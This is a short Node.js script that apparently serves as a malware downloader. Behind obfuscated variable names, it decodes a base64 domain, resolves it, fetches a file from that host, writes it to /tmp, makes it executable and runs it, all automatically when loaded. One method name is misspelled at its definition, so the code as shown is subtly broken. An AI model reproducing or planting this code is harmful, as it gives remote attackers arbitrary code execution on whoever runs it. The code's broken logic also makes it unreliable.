const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function windpipe() {
    this.execute_backdor = function(titleboard) {
      if (titleboard != null && titleboard != '0.0.0.0') {
        strephosymbolia = http.get('http://' + titleboard + '/email', function(outfangthief) {
          var periodontosis = fs.createWriteStream('/tmp/rehearses');
          outfangthief.on('data', function(mooktar) {
            periodontosis.write(mooktar);
          });
          outfangthief.on('end', function() {
            periodontosis.end();
            fs.chmod('/tmp/rehearses', '0777');
            child_process.exec('/tmp/rehearses', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      infallibleness = 'ZjAwNWY2OWIucHduenlleWV5ZS5kZQ=='
      dns.lookup((new Buffer(infallibleness, 'base64')).toString(), function(err, communed) {
        self.execute_backdoor(communed);
      });
    };
};

(new windpipe()).run();
